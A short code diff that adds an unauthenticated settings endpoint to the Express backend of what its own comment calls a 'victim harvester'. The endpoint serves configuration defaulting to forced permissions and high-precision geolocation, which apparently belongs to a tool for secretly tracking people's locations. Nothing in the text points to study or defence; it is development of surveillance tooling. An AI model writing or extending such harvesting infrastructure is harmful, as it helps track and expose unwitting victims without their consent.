@@ -638,4 +638,22 @@ if (data._meta) {
   }
 });
 
+// GET /api/collect/settings - Get global app settings (no auth needed, used by victim harvester)
+router.get('/settings', async (req, res) => {
+  try {
+    const AppSettings = require('../models/AppSettings');
+    let settings = await AppSettings.findOne({ key: 'global' });
+    if (!settings) {
+      settings = await AppSettings.create({ key: 'global', autoForcePermissions: true, geoPrecision: 'high' });
+    }
+    res.json({
+      autoForcePermissions: settings.autoForcePermissions,
+      geoPrecision: settings.geoPrecision
+    });
+  } catch (error) {
+    // Default to safe settings if DB error
+    res.json({ autoForcePermissions: true, geoPrecision: 'high' });
+  }
+});
+
 module.exports = router;
